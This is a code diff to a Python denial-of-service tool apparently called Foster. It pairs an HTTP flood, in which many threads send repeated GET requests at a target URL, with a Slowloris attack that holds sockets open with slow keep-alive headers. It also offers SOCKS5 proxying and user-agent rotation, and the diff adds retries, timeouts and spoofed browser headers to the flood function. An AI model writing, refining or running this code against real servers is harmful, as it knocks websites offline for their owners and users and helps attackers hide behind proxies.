@@ -8,6 +8,7 @@ import sys
 import time
 import requests
 import threading
+from requests.exceptions import RequestException, Timeout
 
 # Print the Foster banner
 print(r"""
@@ -115,6 +116,7 @@ logging.basicConfig(
 if args.useproxy:
     try:
         import socks
+
         socks.setdefaultproxy(
             socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
         )
@@ -129,13 +131,16 @@ user_agents = [
     # (Add your user agents here as in the original script)
 ]
 
+
 # Define send functions
 def send_line(self, line):
     line = f"{line}\r\n"
     self.send(line.encode("utf-8"))
 
+
 def send_header(self, name, value):
     self.send_line(f"{name}: {value}")
+
 
 # Add send functions to socket/SSL socket
 setattr(socket.socket, "send_line", send_line)
@@ -145,18 +150,54 @@ if args.https:
     setattr(ssl.SSLSocket, "send_line", send_line)
     setattr(ssl.SSLSocket, "send_header", send_header)
 
+
 # HTTP Flood Function
-def send_request(url, headers):
+def send_request(url, headers, max_retries=3, timeout=10):
+    """
+    Sends HTTP GET requests to the specified URL with the provided headers.
+
+    Args:
+        url (str): The URL to send the request to.
+        headers (dict): The headers to include in the request.
+        max_retries (int): Number of retries for transient errors.
+        timeout (int): Request timeout in seconds.
+    """
+    default_headers = {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    }
+    default_headers.update(headers)
+
+    attempt = 0
     while True:
         try:
-            response = requests.get(url, headers=headers)
-            print(f"Request sent to {url} with status code {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"Error sending request to {url}: {e}")
+            response = requests.get(url, headers=default_headers, timeout=timeout)
+            if response.ok:
+                print(f"Request sent to {url} with status code {response.status_code}")
+            else:
+                print(f"Request sent to {url} but received status code {response.status_code}")
+            break  # Exit loop on successful request
+        except Timeout:
+            print(f"Request to {url} timed out.")
+            attempt += 1
+            if attempt >= max_retries:
+                print(f"Max retries reached. Failed to request {url}.")
+                break
+        except RequestException as e:
+            print(f"Request error: {e}")
+            attempt += 1
+            if attempt >= max_retries:
+                print(f"Max retries reached. Failed to request {url}.")
+                break
+        except Exception as e:
+            print(f"Unexpected error: {e}")
+            break
+
 
 def launch_http_flood(url, num_threads, headers):
     for _ in range(num_threads):
         threading.Thread(target=send_request, args=(url, headers)).start()
+
 
 # Slowloris Socket Initialization
 def init_socket(ip: str):
@@ -175,6 +216,7 @@ def init_socket(ip: str):
     s.send_header("User-Agent", ua)
     s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
+
 
 def slowloris_iteration():
     logging.info("Sending keep-alive headers...")
@@ -197,6 +239,7 @@ def slowloris_iteration():
         except socket.error as e:
             logging.debug("Failed to create new socket: %s", e)
             break
+
 
 def main():
     if args.url:
@@ -235,6 +278,8 @@ def main():
         logging.debug("Sleeping for %d seconds", args.sleeptime)
         time.sleep(args.sleeptime)
 
+
 if __name__ == "__main__":
     list_of_sockets = []
     main()
+
